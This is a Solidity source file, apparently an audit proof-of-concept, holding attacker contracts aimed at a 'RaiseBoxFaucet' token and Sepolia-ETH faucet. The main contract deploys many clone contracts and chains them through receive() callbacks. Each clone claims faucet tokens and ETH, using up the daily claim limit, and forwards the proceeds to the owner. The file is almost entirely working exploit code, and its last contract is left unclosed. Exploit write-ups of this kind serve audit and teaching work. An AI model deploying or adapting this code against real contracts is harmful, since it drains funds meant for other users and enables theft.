// SPDX-Lincense-Identifier: MIT
pragma solidity ^0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";


interface IRaiseBoxFaucet is IERC20 {
    function claimFaucetTokens() external;
    function getContractSepEthBalance() external view returns (uint256);
    function sepEthAmountToDrip() external view returns(uint256);
    function dailyClaimLimit() external view returns(uint256);
    function dailyDrips() external view returns(uint256);
    function dailySepEthCap() external view returns(uint256);
    function dailyClaimCount() external view returns(uint256);
}


contract AttackerMainContract is Ownable {
    IRaiseBoxFaucet raiseBoxFaucet;
    address public implementation;
    address payable[] public attackers;
    bool public isSetupComplete;
    constructor(address _raiseBoxFauecet)Ownable(msg.sender) payable{
        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet);
        implementation = address(new AttackerContract(address(raiseBoxFaucet)));
    }

    function deployAttackers(uint256 count) external onlyOwner {
        require(!isSetupComplete, "Setup already completed");
        
        for(uint i = 0; i < count; i++) {
            address clone = Clones.clone(implementation);
            attackers.push(payable(clone));
        }
    }

    function setupChain() external onlyOwner {
        require(attackers.length > 0, "No attackers deployed");
        require(!isSetupComplete, "Setup already completed");
        
        for(uint i = 0; i < attackers.length - 1; i++) {
            AttackerContract(attackers[i]).setNextAddress(attackers[i + 1]);
        }
        
        isSetupComplete = true;
    }

    function attack() external onlyOwner {
        require(isSetupComplete, "Setup not completed");
        require(attackers.length > 0, "No attackers deployed");
      
        AttackerContract(attackers[0]).attack();
        
        (, bool numberIsEven) = getNumberOfContract();
        if(!numberIsEven && raiseBoxFaucet.dailyClaimCount() < raiseBoxFaucet.dailyClaimLimit()) {
            raiseBoxFaucet.claimFaucetTokens();
        }

        _withdrawAll();
    }


    function withdrawAll() external onlyOwner {
        _withdrawAll();
    }

    function _withdrawAll() private {
        uint256 tokenBalance = raiseBoxFaucet.balanceOf(address(this));
        if(tokenBalance > 0) {
            raiseBoxFaucet.transfer(owner(), tokenBalance);
        }
        
        uint256 ethBalance = address(this).balance;
        if(ethBalance > 0) {
            (bool success, ) = owner().call{value: ethBalance}("");
            require(success, "Final ETH transfer failed");
        }
    }

    function reset() external onlyOwner {
        delete attackers;
        isSetupComplete = false;
    }

    receive() payable external {
        
    }

    function getNumberOfContract()public view returns(uint256, bool){
        uint256 temporaryNumberOfContracts = (raiseBoxFaucet.dailyClaimLimit() - raiseBoxFaucet.dailyClaimCount())* 10 / 2;
        uint256 numberOfContracts;
        bool numberIsEven;
        if(temporaryNumberOfContracts % 10 == 0){
            numberIsEven = true;
            numberOfContracts = temporaryNumberOfContracts / 10;
        } else {
            numberOfContracts = (temporaryNumberOfContracts - 5) /10;
        }
        return(numberOfContracts, numberIsEven);
    }
}

contract AttackerContract {
    IRaiseBoxFaucet public immutable raiseBoxFaucet;
    address private immutable deployer;
    address payable private nextAddress;
    
    constructor(address _raiseBoxFaucet) {
        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFaucet);
        deployer = msg.sender;
    }

    function setNextAddress(address _nextAddress) external {
        require(msg.sender == deployer, "Not authorized");
        nextAddress = payable(_nextAddress);
    }

    function attack() external {
        raiseBoxFaucet.claimFaucetTokens();
        
        uint256 ethBalance = address(this).balance;
        if(ethBalance > 0) {
            (bool ethSuccess, ) = deployer.call{value: ethBalance}("");
            require(ethSuccess, "ETH transfer failed");
        }
        
        uint256 tokenBalance = raiseBoxFaucet.balanceOf(address(this));
        if(tokenBalance > 0) {
            bool tokenSuccess = raiseBoxFaucet.transfer(deployer, tokenBalance);
            require(tokenSuccess, "Token transfer failed");
        }
    }

    receive() external payable {
        if(nextAddress != address(0)) {
            AttackerContract(nextAddress).attack();
        }
    }